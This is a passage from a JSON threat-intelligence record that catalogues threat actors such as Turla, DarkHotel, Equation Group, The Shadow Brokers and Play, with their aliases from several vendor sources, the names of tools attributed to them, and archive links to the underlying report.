            "id": "171b85f2-8f6f-46c0-92e0-c591f61ea167",
            "created_at": "2023-01-06T13:46:38.830188Z",
            "updated_at": "2025-03-27T02:00:02.929729Z",
            "deleted_at": null,
            "main_name": "The Shadow Brokers",
            "aliases": [
                "Shadow Brokers",
                "ShadowBrokers",
                "The ShadowBrokers",
                "TSB"
            ],
            "source_name": "MISPGALAXY:The Shadow Brokers",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "2b4eec94-7672-4bee-acb2-b857d0d26d12",
            "created_at": "2023-01-06T13:46:38.272109Z",
            "updated_at": "2025-03-27T02:00:02.790029Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "DUBNIUM",
                "Fallout Team",
                "Luder",
                "Tapaoux",
                "Shadow Crane",
                "APT-C-06",
                "SIG25",
                "Karba",
                "Nemim",
                "Nemin",
                "G0012",
                "ATK52",
                "T-APT-02",
                "TUNGSTEN BRIDGE",
                "Zigzag Hail"
            ],
            "source_name": "MISPGALAXY:DarkHotel",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a97cf06d-c2e2-4771-99a2-c9dee0d6a0ac",
            "created_at": "2022-10-25T16:07:24.349252Z",
            "updated_at": "2025-03-27T02:02:10.184406Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "ATK 13",
                "Belugasturgeon",
                "Blue Python",
                "CTG-8875",
                "Group 88",
                "ITG12",
                "Iron Hunter",
                "Krypton",
                "Makersmark",
                "Operation Epic Turla",
                "Operation Moonlight Maze",
                "Operation Penguin Turla",
                "Operation Satellite Turla",
                "Operation Skipper Turla",
                "Operation Turla Mosquito",
                "Operation WITCHCOVEN",
                "Pacifier APT",
                "Pensive Ursa",
                "Popeye",
                "SIG15",
                "SIG2",
                "SIG23",
                "Secret Blizzard",
                "TAG-0530",
                "Turla",
                "UNC4210",
                "Venomous Bear",
                "Waterbug"
            ],
            "source_name": "ETDA:Turla",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "ATI-Agent",
                "AdobeARM",
                "Agent.BTZ",
                "Agent.DNE",
                "BigBoss",
                "COMpfun",
                "Chinch",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobra Carbon System",
                "ComRAT",
                "DoublePulsar",
                "EmPyre",
                "EmpireProject",
                "Epic Turla",
                "EternalBlue",
                "EternalRomance",
                "GoldenSky",
                "Group Policy Results Tool",
                "HTML5 Encoding",
                "HyperStack",
                "IcedCoffee",
                "IronNetInjector",
                "KSL0T",
                "Kapushka",
                "Kazuar",
                "KopiLuwak",
                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1588746695,
    "ts_modification_date": 1588746695,
    "files": {
        "pdf": "https://archive.orkl.eu/8f5591c1ec9f6b2911112c53dc551374a00b66c3.pdf",
        "text": "https://archive.orkl.eu/8f5591c1ec9f6b2911112c53dc551374a00b66c3.txt",
        "img": "https://archive.orkl.eu/8f5591c1ec9f6b2911112c53dc551374a00b66c3.jpg"
    }
}